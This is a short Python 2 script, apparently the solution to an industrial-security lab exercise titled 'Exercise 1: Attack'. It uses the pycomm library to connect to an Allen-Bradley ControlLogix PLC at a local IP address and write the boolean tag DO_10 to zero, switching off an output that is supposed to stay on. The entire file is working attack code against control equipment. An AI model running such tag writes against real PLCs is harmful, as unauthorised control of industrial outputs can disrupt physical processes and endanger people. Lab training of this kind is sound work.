#!/usr/bin/env python2
"""Exercise 1: Attack

The button DO_10 is supposed to stay lit at all times.
Perform an attack to switch off the light of the button DO_10.
"""
from pycomm.ab_comm.clx import Driver as ClxDriver

PLC_IP = '192.168.1.151'
TAG_NAME = 'DO_10'
VALUE = 0
TAG_TYPE = 'BOOL'

def write_plc(
        plc_ip=PLC_IP,
        tag_name=TAG_NAME,
        value=VALUE,
        tag_type=TAG_TYPE
        ):
    plc = ClxDriver()
    if plc.open(plc_ip):
        if plc.write_tag(tag_name, value, tag_type):
            print("Success")
            print("Target: " + plc_ip)
            print("Tag Name: " + tag_name)
            print("Value: " + str(value))
            print("Tag Type: " + tag_type)
        else:
            print("Failed to write to " + plc_ip)
        plc.close()
    else:
        print("Unable to open: ", plc_ip)

if __name__ == '__main__':
    write_plc()
